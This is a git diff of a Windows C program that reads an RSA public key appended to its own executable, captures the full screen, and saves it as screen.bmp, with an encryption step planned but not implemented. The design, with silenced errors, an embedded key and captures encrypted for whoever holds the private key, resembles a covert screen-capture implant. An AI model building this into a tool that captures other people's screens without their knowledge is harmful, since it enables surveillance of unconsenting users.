@@ -1,15 +1,3 @@
-#include <Windows.h>
-#include <stdio.h>
-#include "polarssl\pk.h"
-
-//set to 1 for OutputDebugString usage instead of file output
-#define DISPLAY_ERRORS 0
-//error level output, you know the drill
-#define DBG_INFO 1
-#define DBG_WARNING 2
-#define DBG_ERROR 3
-
-#define WIN32_LEAN_AND_MEAN
 /*
 http://stackoverflow.com/questions/3291167/how-to-make-screen-screenshot-with-win32-in-c
 Use GetDC(NULL); to get a DC for the entire screen.
@@ -32,6 +20,19 @@ http://stackoverflow.com/questions/1231178/load-an-x509-pem-file-into-windows-cr
 smaller exe
 http://thelegendofrandom.com/blog/archives/2231
 */
+#include <Windows.h>
+#include <stdio.h>
+#include "polarssl\pk.h"
+
+//set to 1 for OutputDebugString usage instead of file output
+#define DISPLAY_ERRORS 0
+//error level output, you know the drill
+#define DBG_INFO 1
+#define DBG_WARNING 2
+#define DBG_ERROR 3
+
+#define WIN32_LEAN_AND_MEAN
+
 
 /*
 	prints out messages either to screen or to file
@@ -75,18 +76,62 @@ unsigned char *getpublickeyfromself(const char *filename,int *keylen){
 	HANDLE openedfile = NULL;
 	int filesize = 0;
 	BOOL fileread = FALSE;
-	unsigned char *publickey;
+	unsigned char *publickey = NULL;
 	int publickeysize = {0};
-	DWORD bytesread;
+	DWORD bytesread = 0;
+	DWORD setfilepointerresult = 0;
+	BOOL readfileresult = FALSE;
 
 	openedfile = CreateFile(filename,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+	if(openedfile == INVALID_HANDLE_VALUE){
+		return NULL;
+	}
+
 	filesize = GetFileSize(openedfile,NULL);
-	printf("fp %i\n",SetFilePointer(openedfile,-4,NULL,FILE_END));
-	ReadFile(openedfile,&publickeysize,4,&bytesread,NULL);
-	publickey = (unsigned char *)malloc(publickeysize+1);
-	SecureZeroMemory(publickey,publickeysize+1);
-	printf("fp %i\n",SetFilePointer(openedfile,(-4-publickeysize),NULL,FILE_END));
-	ReadFile(openedfile,publickey,publickeysize,&bytesread,NULL);
+	if(filesize == INVALID_FILE_SIZE){
+		return NULL;
+	}
+
+	//read the size of the public key data we want
+	setfilepointerresult = SetFilePointer(openedfile,-4,NULL,FILE_END);
+	if(setfilepointerresult == INVALID_SET_FILE_POINTER){
+		CloseHandle(openedfile);
+		return NULL;
+	}
+
+	readfileresult = ReadFile(openedfile,&publickeysize,4,&bytesread,NULL);
+	if(readfileresult == FALSE){
+		CloseHandle(openedfile);
+		return NULL;
+	}
+	//reset filepointer
+	setfilepointerresult = 0;
+	setfilepointerresult = SetFilePointer(openedfile,-4,NULL,FILE_END);
+	if(setfilepointerresult == INVALID_SET_FILE_POINTER){
+		CloseHandle(openedfile);
+		return NULL;
+	}
+	//account for nullbyte
+	publickeysize = publickeysize+1;
+	publickey = (unsigned char *)malloc(publickeysize);
+	SecureZeroMemory(publickey,publickeysize);
+	//set filepointer to beginning of public key data
+	setfilepointerresult = 0;
+	setfilepointerresult = SetFilePointer(openedfile,-(publickeysize-1),NULL,FILE_CURRENT);
+	if(setfilepointerresult == INVALID_SET_FILE_POINTER){
+		CloseHandle(openedfile);
+		SecureZeroMemory(publickey,publickeysize);
+		free(publickey);
+		return NULL;
+	}
+	readfileresult = FALSE;
+	readfileresult = ReadFile(openedfile,publickey,publickeysize-1,&bytesread,NULL);
+	if(readfileresult == FALSE){
+		CloseHandle(openedfile);
+		SecureZeroMemory(publickey,publickeysize);
+		free(publickey);
+		return NULL;
+	}
 	CloseHandle(openedfile);
 	*keylen = publickeysize;
 	return publickey;
@@ -241,7 +286,7 @@ int takescreenshot(char **screenshotbuffer,int *screenshotbuffersize){
 }
 
 void rsacrypt(const unsigned char *rsapublickey, int rsapublickeylen){
-	pk_context pkctx;
+	pk_context pkctx = {0};
 	int pkresult = 0;
 	unsigned char *output = NULL;
 	size_t olen=0,osize = 0;
@@ -262,33 +307,44 @@ void rsacrypt(const unsigned char *rsapublickey, int rsapublickeylen){
 
 
 int main(int argc, char *argv[]){
+	//misc vars
+	unsigned char currentpath[MAX_PATH] = {0};
+	//vars for getting public key from exe
+	unsigned char *pubrsakey = NULL;
+	int pubkeylen = 0;	
+	//vars for taking the screenshot
 	char *finalbmpfile = NULL;
 	int finalbmpfilesize = 0;
 	DWORD dwBytesWritten = 0;
 	HANDLE hFile = NULL;
 
-	/*temp
-	unsigned char *pubrsakey;
-	int pubkeylen = 0;
+	/* get public key*/
 	GetModuleFileName(NULL,&currentpath[0],sizeof(currentpath));
-	printf("%s\n",currentpath);
 	pubrsakey = getpublickeyfromself(&currentpath[0],&pubkeylen);
-	printf("len: %i\n %s\n",pubkeylen,pubrsakey);
-	rsacrypt(pubrsakey,pubkeylen);
-	exit(0);
-	temp*/
+	if(pubrsakey == NULL){
+		SecureZeroMemory(currentpath,(sizeof(currentpath)/sizeof(currentpath[0])));
+		exit(1);
+	}
 
-
+	/* take screenshot */
 	if(takescreenshot(&finalbmpfile,&finalbmpfilesize) == 1){
 		SecureZeroMemory(finalbmpfile,finalbmpfilesize);
+		SecureZeroMemory(currentpath,(sizeof(currentpath)/sizeof(currentpath[0])));
 		free(finalbmpfile);
 		exit(1);
 	}
 
+	/* encrypt screenshot */
+
+	/* save screenshot */
 	hFile = CreateFile("screen.bmp", GENERIC_WRITE, 0, NULL,CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	WriteFile(hFile,finalbmpfile,finalbmpfilesize,&dwBytesWritten,NULL);
 	CloseHandle(hFile);
+
+	/* cleanup */
 	SecureZeroMemory(finalbmpfile,finalbmpfilesize);
+	SecureZeroMemory(currentpath,(sizeof(currentpath)/sizeof(currentpath[0])));
 	free(finalbmpfile);
+	free(pubrsakey);
 	return 0;
 }
